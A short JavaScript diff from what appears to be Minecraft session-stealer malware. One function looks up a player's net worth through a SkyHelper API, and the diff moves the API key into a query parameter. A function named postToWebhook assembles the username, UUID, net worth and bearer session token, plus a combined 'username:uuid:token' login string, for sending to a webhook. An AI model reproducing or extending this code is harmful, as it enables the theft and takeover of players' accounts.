@@ -121,9 +121,12 @@ async function checkNetworth(name){
     const config = {
         headers: {
             'Content-Type': 'application/json',
-            'Accept': 'application/json',
-            'authorization': 'dxxxxy'
+            'Accept': 'application/json'
+        },
+        params: {
+            'key': 'dxxxxy'
         }
+
     }
     const url = `https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${name}`
     const response = await axios.get(url, config)
@@ -142,7 +145,7 @@ function postToWebhook(username, bearerToken, uuid, networth) {
                 {name: "UUID", value: uuid, inline: true},
                 {name: "ELT", value: networth / 1000000 + "M", inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
+                {name: "Login", value: username + ":" + uuid + ":"    + bearerToken, inline: true},
             ]
         }]
     }
